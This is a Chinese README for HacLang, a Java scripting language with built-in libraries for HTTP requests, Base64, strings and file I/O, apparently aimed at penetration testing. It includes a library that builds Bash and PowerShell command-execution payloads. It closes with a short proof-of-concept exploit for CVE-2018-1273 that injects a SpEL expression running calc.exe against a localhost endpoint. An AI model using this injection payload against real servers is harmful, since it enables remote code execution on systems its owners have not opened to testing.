# HacLang

![](https://img.shields.io/badge/build-passing-brightgreen)
![](https://img.shields.io/badge/Java-8-red)

## 介绍

![](https://github.com/EmYiQing/HacLang/blob/master/img/logo.png)

这是一个基于`Java`的脚本语言，提供了一些简单的内置库
1. 实现基于状态机的词法分析
2. 巴科斯范式（BNF）生成抽象语法树
3. 递归遍历抽象语法树执行代码

## 基础

### 01 Hello World

新建一个文件：`1.h`并编写如下内容

```cpp
print("hello world");
```

执行：`java -jar HacLang.jar 1.h`

### 02 if else

类似`Golang`的写法

```cpp
a = 1;
b = 2;
if a+b == 3 {
    // do something
} else {
    // do something
}
```

### 03 while

支持`while`循环

```cpp
i = 0;
while i < 10 {
    i = i + 1;
    print(i);
}
```

### 04 函数

类似`Python`的写法

```cpp
def test(a,b) {
    if a > b {
        return a;
    } else {
        return b;
    }
}
print(test(1,2));

a = fun(b) {
    print(b)
}

a("hello world");
```

### 05 多线程

类似`Golang`的写法

```cpp
def test() {
    print(2);
}

go test();
```

### 06 数组

类似`Python`的写法

```cpp
array = [1,2,3];
print(array);
str = ["test1","test2","test3"]
print(str);
```

### 07 内置库：Time

支持简单的时间获取操作

```cpp
// 程序运行当前时间
print(currentTime());
// 格式化后的当前时间
print(formatTime());
```

### 08 内置库：Input

命令行输入操作

```cpp
data = input();
print(data);
```

### 09 内置库：Collection

这是最重要的一个库，底层是`HashMap`

```cpp
// new map
map = newMap();
// put
putMap(map,"key","value");
// get
data = getMap(map,"key");
print(data);
// clear
clearMap(map);
data = getMap(map,"key");
print(data);
```

### 10 内置库：Convert

用于类型转换

```cpp
a = "1";
b = toInt(a);
c = toStr(b);
```

### 11 内置库：File

简单的文件读写操作

```cpp
writeFile("test.txt","hello world");
data = readFile("test.txt");
print(data);
```

### 12 内置库：Print

简单的打印函数，会根据输入的类型判断如何打印

```cpp
a = "hello world";
print(a);
```

### 13 内置库：Util

目前只提供计算长度的功能，会根据输入类型判断

```cpp
a = "test";
print(length(a));
b = [1,2,3,4,5];
print(length(b));
```

## 库

### 01 Base64库

引入`base64`库即可进行编码解码操作

```cpp
#include "base64"

data = "4ra1n";
enc = base64::encode(data);
print(enc);

dec = base64::decode(enc);
print(dec);

decStr = toStr(dec);
print(decStr);
```

### 02 String库

一些常见的字符串操作

```cpp
#include "string"

// isEmpty
test = "hello world";
if string::isEmpty(test)==false {
    print("not null");
}

// contains
if string::contains(test,"world") {
    print("contains world")
}

// split
split = string::split(test," ");
len = length(split);
i = 0;
while i<len {
    print(split[i]);
    i = i + 1;
}

// substr
sub = string::substr(test,1,4);
print(sub);
```

### 03 HTTP库

这也是最重要的库之一，基于`okhttp`实现

支持直接`get`或`post`，也可以根据`Burp`的请求文件做请求

```cpp
#include "http"
#include "string"

// 请求头是Map类型
headers = newMap();
// 可以自行设置一些请求头（也可不设置）
putMap(headers,"User-Agent","4ra1n");
// URL
url = "http://127.0.0.1:8080";
// GET 请求
response = http::doGet(url,headers);

// POST 请求体
body = "username=1&password=2"
// 需要自行选择Content-Type
// 默认支持form和json两种（也是最常见的两种）
// form=application/x-www-form-urlencoded
// json=application/form
contentType = "form";
// POST 请求
http::doPost(url,headers,body,contentType);

// 响应码
code = getMap(response,"code");
print("response code is: "+code);
// 响应头也是Map类型
respHeaders = getMap(response,"headers");
// 从响应头中取值
connection = getMap(respHeaders,"Connection")
print("Connection: "+connection)
// 获得响应体
responseBody = getMap(response,"body");
if string::contains(responseBody,"Tomcat")==true {
    print("Tomcat")
}

// 使用请求报文
req = readFile("1.txt");
http::doRequest(req);
```

### 04 Tool库

生成命令执行的`Payload`

Java中直接执行命令会存在问题，所以需要特殊处理

```cpp
#include "tool"

// 针对Bash的命令
payload = tool::getBashCommand("calc.exe");
print(payload);

// 一种特殊的Payload
payload = tool::getStringCommand("calc.exe");
print(payload);

// 针对Powershell的命令
payload = tool::getPowershellCommand("calc.exe");
print(payload);

// 执行命令
tool::exec(payload);
```

### 07 案例一

案例一：针对`CVE-2018-1273`的`POC`

```cpp
#include "http"

// CVE-2018-1273
// https://xz.aliyun.com/t/2269
def poc(){
    // application/x-www-form-urlencoded alias
    contentType = "form";
    // request body (only in post method)
    body = "username[#this.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"calc.exe\")]";
    // do http post request
    http::doPost("http://127.0.0.1:8080/users",newMap(),body,contentType);
}

poc();
```

## 感谢

一些底层的代码参考：《两周自制脚本语言》（人民邮电出版社）

自己完善了书中的一些不足之处，并加入很多新的功能
